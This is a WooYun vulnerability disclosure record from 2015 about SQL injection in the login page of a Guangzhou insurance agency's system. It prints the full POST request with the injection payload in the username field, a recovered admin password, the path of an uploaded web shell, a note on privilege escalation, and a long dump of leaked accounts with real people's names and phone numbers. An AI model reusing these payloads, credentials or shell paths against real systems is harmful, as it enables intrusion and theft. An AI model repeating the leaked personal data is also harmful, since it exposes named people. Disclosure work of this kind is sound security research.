{"id": 14545, "wybug_id": "wooyun-2015-0131849", "wybug_title": "广州亚浦保险系统SQL注射漏洞（泄露5家合作大型保险公司上万保单+多家旅行社充值业务）", "wybug_corp": "广州亚浦保险", "wybug_author": "路人甲", "wybug_date": "2015-08-05 15:34", "wybug_open_date": "2015-09-20 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "已交由第三方合作机构(广东省信息安全测评中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向公众公开  简要描述： 广州亚浦保险系统SQL注射漏洞（泄露5家合作大型保险公司上万保单+多家旅行社充值业务） 详细说明：  www.insissue.com  登录存在post注入，通过注入得到默认账户，上传得到SHELL。sa提权    漏洞证明：  \nPOST / HTTP/1.1Host: www.insissue.comContent-Length: 297Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.insissue.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://www.insissue.com/Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUJMTc5Nzg4NjM2ZGQl0aoV3hvEN1wreft8odJrH3S9PA%3D%3D&__VIEWSTATEGENERATOR=90059987&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=%2FwEWBALZmMvCBwKvruq2CAKyxeCRDwKPyPGACocEYGHXPKFt0tPDfTSet4hIg8CA&UserName=a%27+and+user%3E0--&PassWord=aaa&login=%E7%99%BB%E5%BD%95\nPOST包\nadmin apool2013\nhttp://www.insissue.com/js/2014.aspx shell地址\n\n5家合作保险公司\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n用户名\t所属公司\t电话号码\t真实姓名\t下级用户\t Selectk1\t测试旅行社\t13888888888\tk3\t\tapool\t亚浦保险\t87375399\t亚浦保险\t\tfengguang\t广东风光国际旅行社有限公司\t83300677\t风光\t\tTONY\tTONY\t13719002677\ttony lee\t\tDFGL1\t东方国旅国际商务部\t86699032\t东方国旅国际商务部\tDFGL2\tDFGL2\t东方国旅国际商务部\t86699032\t东方国旅国际商务部\t\tXMZYX\t广东熊猫国际旅游有限公司（自由行部）\t83185855\tvivi\t\tFSGLSS\t佛山国旅山水营业部\t\t佛山国旅山水营业部\t\tQWCG\t广东侨外出国人员服务中心有限公司\t0757-22381348\t欧志成\t\t邓绮媚\tSISI\t81043325\t\t\tESTRAVEL\t广州市创游国际旅行社有限责任公司\t\t广州市创游国际旅行社有限责任公司\t\ttest\t测试旅行社\t\t\t\tSINTU\t广州新途旅行社有限公司\t\t广州新途旅行社有限公司\t\tWGY\t东方签证网\t13632298008\t东方签证网\t\tLHCZB\t领航国旅操作部\t61206989-52\t领航国旅操作部\t\tLHQZB\t领航国旅签证部\t61206989-31\t领航国旅签证部\t\tOMSL\t广东和平国旅欧美商旅部\t61223846\t广东和平国旅欧美商旅部\t\tXMPW\t广东熊猫国际旅游有限公司票务部\t83236265\t广东熊猫国际旅游有限公司票务部\t\tHY\t广州市汇粤国际旅行社有限公司\t83197103\t广州市汇粤国际旅行社有限公司\t\tQSGL\t广州市千适国际旅行社有限公司\t66315333\t广州市千适国际旅行社有限公司\t\tZXGL\t广东中信国际旅行社有限公司\t81719815\t广东中信国际旅行社有限公司\t\tXMYWB\t广东熊猫国际旅游有限公司业务部\t83548108\t广东熊猫国际旅游有限公司业务部\t\tXIMIN\t广州西敏国际旅行社有限公司总号\t38114000\t广州西敏国际旅行社有限公司\tXIMINCJBXIMINRJBXIMINSWBXIMINPWB\tXIMINCJB\t广州西敏国际旅行社有限公司出境部\t\t广州西敏国际旅行社有限公司出境部\t\tXIMINRJB\t广州西敏国际旅行社有限公司入境部\t\t广州西敏国际旅行社有限公司入境部\t\tXIMINSWB\t广州西敏国际旅行社有限公司商务部\t\t广州西敏国际旅行社有限公司商务部\t\tXIMINPWB\t广州西敏国际旅行社有限公司票务部\t\t广州西敏国际旅行社有限公司票务部\t\tDTA\t美国钻石商旅集团\t\t美国钻石商旅集团\t\tFEIXIN\t广州市飞顺商务服务有限公司\t\t飞信假期\t\tDFGJSW\t广州东方国际旅行社有限公司旅游中心\t86018829\t东方国旅国际商务旅游中心\t\tFSGLGC\t佛山国旅国际旅行社有限公司桂城门市部\t13500250909\t佛山国旅桂城门市部\t\tDFGJCJ\t广州东方国际旅行社有限公司出境游中心\t86018783\t东方国旅出境游中心\t\tZXSDY\t广东中信国际旅行社有限公司深度游\t87302210\t中信国旅深度游\t\tGRK\t郭仁凯\t13503034715\t郭仁凯\t\tSEDA01\t深圳市发展经济研究会\t\t深圳市发展经济研究会\t\tSEDA02\t深圳市发展经济研究会\t\t深圳市发展经济研究会\t\tSEDA03\t深圳市发展经济研究会\t\t深圳市发展经济研究会\t\tSEDA04\t深圳市发展经济研究会\t\t深圳市发展经济研究会\t\tSZZQ\t深圳市中侨国际旅行社有限公司\t13428677521\t深圳市中侨国际旅行社有限公司\t\tGDQL_ZQ\t广东省中国青年旅行社中侨大厦门市部\t13808890467\t广东省中国青年旅行社中侨大厦门市部\t\t13802500289\t王旋\t13802500289\t13802500289\tMAYZHANG LIHONGWXY009571211868889FQZ12226SDA61365CDQ87228WHP70450chuchu688WYH05215LJY98741\t林雪菊01\t林雪菊01\t\t林雪菊\t林雪菊02林雪菊03汤丽\t林雪菊02\t林雪菊02\t\t林雪菊02\t\t林雪菊03\t林雪菊03\t\t林雪菊03\t\tMAY\t庾冬梅\t\t庾冬梅\t\t测试\t测试账户\t\t测试\t测试业务\t刘亚利\t刘亚利\t\t刘亚利\t\t中旅签证\t中旅签证\t\t中旅签证\t中旅签证天河中旅签证订房中旅签证移民中旅签证华夏\t中旅签证天河\t中旅签证\t\t中旅签证天河\t\t中旅签证订房\t中旅签证\t\t中旅签证订房\t\t中旅签证移民\t中旅签证\t\t中旅签证移民\t\t中旅签证华夏\t中旅签证\t\t中旅签证华夏\t\t测试业务\t测试账户\t\t测试业务\t\t陈刚\t陈刚\t\t陈刚\t\t唯意国际\t唯意(深圳）国际旅行社有限公司\t755-2382-2938\t唯意国际\t\t佛山国旅\t佛山国旅\t\t佛山国旅\t佛山国旅佛宾部\tZHANG LIHONG\tZHANG LIHONG\t\tZHANG LIHONG\t\tWXY00957\t伍雪英\t\tWXY00957\t\tWANG QIANJING\t王倩静\t\t王倩静\t\t123\t123\t\t123\t\tLI TINGFENG\tLI TINGFENG\t\tLI TINGFENG\t\tUNI\tUni\t13822110660\t邓颖寰\t\t丽晶之旅\t丽晶之旅\t\t丽晶之旅\t\t凤怡\t凤怡假期\t\t凤怡假期\t\t1211868889\t梁婉琼\t\t梁婉琼\t\tFQZ12226\t樊庆珍\t\tFQZ12226\t\tYTTX1\t深圳市优途天下商务服务有限公司\t\t深圳市优途天下商务服务有限公司\t\tYTTX2\t深圳市优途天下商务服务有限公司\t\t深圳市优途天下商务服务有限公司\t\tSDA61365\t邵定安\t\tSDA61365\t\t蓝天助学\t蓝天助学\t28949864\t蓝天助学\t\tKANG HUI\t康辉\t\t康辉\t\t珠海海外\t珠海海外\t\t珠海海外\t\t环天电子\t环天电子\t\t环天电子\t\tCDQ87228\t楚德庆\t\tCDQ87228\t\t汤丽\t汤丽\t\t汤丽\t\tSMILE\tSMILE\t\tSMILE\t\tTIM\tTIM\t\tTIM\t\tDONALD\t黄楚栩\t\tDONALD\t\tWHP70450\t吴慧屏\t\tWHP70450\t\tchuchu688\tchuchu688\t\tchuchu688\t\tCITSHD\t熊猫旅行社花都分公司\t\tCITSHD\t\tWYH05215\t伍韵华\t13682205215\tWYH05215\t\tTCDJ9999\t广州天长地久旅游有限公司\t\tTCDJ9999\t\t珠海拱北口岸\t珠海拱北口岸\t\t珠海拱北口岸\t珠海拱北口岸票务1珠海拱北口岸票务2\t珠海拱北口岸票务1\t珠海拱北口岸\t\t珠海拱北口岸票务1\t\t珠海拱北口岸票务2\t珠海拱北口岸\t\t珠海拱北口岸票务2\t\t雷勇如\t雷勇如\t\t雷勇如\t\t朱瀚祺\t朱瀚祺\t\t朱瀚祺\t\t兆仁本业\t广州兆仁本业教育科技有限公司\t\t兆仁本业\t\tFS广东中旅财务部\t广东中旅\t\tFS广东中旅财务部\tFS广东中旅四海商旅\tFS广东中旅四海商旅\t广东中旅\t\tFS广东中旅四海商旅\tFS广东中旅出境部FS广东中旅后勤部FS广东中旅罗村部FS广东中旅金沙部FS广东中旅张槎部FS广东中旅丹灶部FS广东中旅建新部\tFS广东中旅出境部\t广东中旅\t\tFS广东中旅出境部\t\tFS广东中旅后勤部\t广东中旅\t\tFS广东中旅后勤部\t\tFS广东中旅罗村部\t广东中旅\t\tFS广东中旅罗村部\t\tFS广东中旅金沙部\t广东中旅\t\tFS广东中旅金沙部\t\tFS广东中旅张槎部\t广东中旅\t\tFS广东中旅张槎部\t\tFS广东中旅丹灶部\t广东中旅\t\tFS广东中旅丹灶部\t\tFS广东中旅建新部\t广东中旅\t\tFS广东中旅建新部\t\t百利沙\t百利沙\t\t百利沙\t百利沙签证百利沙地接百利沙机票百利沙销售\t佛山国旅佛宾部\t佛山国旅\t\t佛山国旅佛宾部\t\t人保测试\t人保测试\t\t人保测试\t\tapool123\tapool123\t\tapool123\t\t查询\t亚浦保险\t\t查询\t\tTONGYOU\t广州童游信息科技有限公司\t\t广州童游信息科技有限公司\t\tLJY98741\tLJY98741\t\tLJY98741\t\tZHANGHUIBING\t张惠冰\t\t张惠冰\t\tYHIT99\t广东熊猫国旅华明分公司\t\t广东熊猫国旅华明分公司\t\tCITSHL\t广东熊猫国旅华乐分公司\t\t广东熊猫国旅华乐分公司\t\t百利沙签证\t百利沙\t\t百利沙签证\t\t百利沙地接\t百利沙\t\t百利沙地接\t\t百利沙机票\t百利沙\t\t百利沙机票\t\t百利沙销售\t百利沙\t\t百利沙销售\t\t范莉梅\t范莉梅\t\t范莉梅\t\t华之通\t华之通\t\t华之通\t\tYCZL\t羊城之旅连新分社\t\t羊城之旅连新分社\tYCZL01YCZL02YCZL03YCZL04YCZL05\tYCZL01\t羊城之旅连新分社01\t\t羊城之旅连新分社01\t\tYCZL02\t羊城之旅连新分社02\t\t羊城之旅连新分社02\t\tYCZL03\t羊城之旅连新分社03\t\t羊城之旅连新分社03\t\tYCZL04\t羊城之旅连新分社04\t\t羊城之旅连新分社04\t\tYCZL05\t羊城之旅连新分社05\t\t羊城之旅连新分社05\t\tYCZL06\t羊城之旅连新分社06\t\t羊城之旅连新分社06\t\t佛山国旅商旅\t佛山国旅\t\t佛山国旅商旅\t\t佛山国旅票务\t佛山国旅\t\t佛山国旅票务\t\t安程旅游\t安程旅游\t\t安程旅游\n设计多家合作旅行社   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-08-06 11:06 厂商回复： 非常感谢您的报告。报告中的问题已确认并复现.影响的数据：高攻击成本：低造成影响：高综合评级为：高，rank：13正在联系相关网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}